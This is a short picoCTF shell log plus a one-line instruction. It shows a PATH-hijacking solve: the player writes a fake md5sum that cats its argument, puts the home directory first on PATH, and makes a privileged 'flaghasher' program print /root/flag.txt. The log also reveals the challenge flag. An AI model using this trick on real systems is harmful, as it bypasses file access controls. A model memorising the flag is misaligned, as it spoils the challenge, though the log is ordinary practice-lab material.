write a fake md5sum in my own home that just cats $1

ctf-player@pico-chall$ ls
flaghasher
ctf-player@pico-chall$ echo '#!/bin/bash' > ~/md5sum
ctf-player@pico-chall$ echo 'cat "$1"' >> ~/md5sum
ctf-player@pico-chall$ chmod +x ~/md5sum
ctf-player@pico-chall$ PATH=~/:$PATH ./flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_63a87fa9}ctf-player@pico-chall$